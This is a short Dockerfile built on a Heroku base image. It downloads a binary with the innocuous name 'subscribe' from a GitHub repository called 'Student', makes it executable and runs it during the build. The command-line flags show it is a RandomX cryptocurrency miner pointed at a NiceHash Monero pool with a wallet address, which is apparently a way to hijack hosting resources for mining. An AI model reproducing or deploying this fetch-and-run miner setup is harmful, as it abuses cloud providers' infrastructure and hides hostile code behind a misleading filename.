FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a rx/0 -o stratum+tcp://randomxmonero.eu.nicehash.com:3380 -u 3GMMqEWU5bNm14rWuM1vcRBNdNDXRKKnfH.Cubozzi
CMD bash heroku.sh
